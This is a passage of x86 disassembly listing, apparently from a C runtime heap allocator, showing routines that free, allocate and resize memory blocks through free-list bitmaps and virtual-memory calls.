  42679a:	push   ebx
  42679b:	lea    ebx,[ecx+esi*1]
  42679e:	mov    edx,DWORD PTR [ebx]
  4267a0:	mov    DWORD PTR [ebp-0xc],edx
  4267a3:	mov    edx,DWORD PTR [esi-0x4]
  4267a6:	mov    DWORD PTR [ebp-0x8],edx
  4267a9:	mov    edx,DWORD PTR [ebp-0xc]
  4267ac:	test   dl,0x1
  4267af:	mov    DWORD PTR [ebp+0xc],ebx
  4267b2:	jne    0x426828
  4267b4:	sar    edx,0x4
  4267b7:	dec    edx
  4267b8:	cmp    edx,0x3f
  4267bb:	jbe    0x4267c0
  4267bd:	push   0x3f
  4267bf:	pop    edx
  4267c0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267c3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267c6:	jne    0x42680a
  4267c8:	cmp    edx,0x20
  4267cb:	mov    ebx,0x80000000
  4267d0:	jae    0x4267eb
  4267d2:	mov    ecx,edx
  4267d4:	shr    ebx,cl
  4267d6:	lea    ecx,[edx+eax*1+0x4]
  4267da:	not    ebx
  4267dc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267e0:	dec    BYTE PTR [ecx]
  4267e2:	jne    0x426807
  4267e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e7:	and    DWORD PTR [ecx],ebx
  4267e9:	jmp    0x426807
  4267eb:	lea    ecx,[edx-0x20]
  4267ee:	shr    ebx,cl
  4267f0:	lea    ecx,[edx+eax*1+0x4]
  4267f4:	not    ebx
  4267f6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267fd:	dec    BYTE PTR [ecx]
  4267ff:	jne    0x426807
  426801:	mov    ecx,DWORD PTR [ebp+0x8]
  426804:	and    DWORD PTR [ecx+0x4],ebx
  426807:	mov    ebx,DWORD PTR [ebp+0xc]
  42680a:	mov    edx,DWORD PTR [ebx+0x8]
  42680d:	mov    ebx,DWORD PTR [ebx+0x4]
  426810:	mov    ecx,DWORD PTR [ebp-0x4]
  426813:	add    ecx,DWORD PTR [ebp-0xc]
  426816:	mov    DWORD PTR [edx+0x4],ebx
  426819:	mov    edx,DWORD PTR [ebp+0xc]
  42681c:	mov    ebx,DWORD PTR [edx+0x4]
  42681f:	mov    edx,DWORD PTR [edx+0x8]
  426822:	mov    DWORD PTR [ebx+0x8],edx
  426825:	mov    DWORD PTR [ebp-0x4],ecx
  426828:	mov    edx,ecx
  42682a:	sar    edx,0x4
  42682d:	dec    edx
  42682e:	cmp    edx,0x3f
  426831:	jbe    0x426836
  426833:	push   0x3f
  426835:	pop    edx
  426836:	mov    ebx,DWORD PTR [ebp-0x8]
  426839:	and    ebx,0x1
  42683c:	mov    DWORD PTR [ebp-0xc],ebx
  42683f:	jne    0x4268d4
  426845:	sub    esi,DWORD PTR [ebp-0x8]
  426848:	mov    ebx,DWORD PTR [ebp-0x8]
  42684b:	sar    ebx,0x4
  42684e:	push   0x3f
  426850:	mov    DWORD PTR [ebp+0xc],esi
  426853:	dec    ebx
  426854:	pop    esi
  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
